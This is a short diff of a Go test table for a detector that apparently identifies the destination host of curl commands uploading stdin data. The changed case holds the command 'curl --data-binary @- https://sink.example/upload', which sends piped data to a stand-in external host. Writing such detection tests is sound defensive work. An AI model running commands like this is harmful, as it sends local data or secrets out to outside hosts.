@@ -122,8 +122,8 @@ func TestStaticCurlStdinUploadTargets(t *testing.T) {
 			wantHost: "sink.example",
 		},
 		{
-			name:     "joined literal stdin body",
-			command:  "curl --data-binary=@- https://sink.example/upload",
+			name:     "separated long literal stdin body",
+			command:  "curl --data-binary @- https://sink.example/upload",
 			wantHost: "sink.example",
 		},
 		{
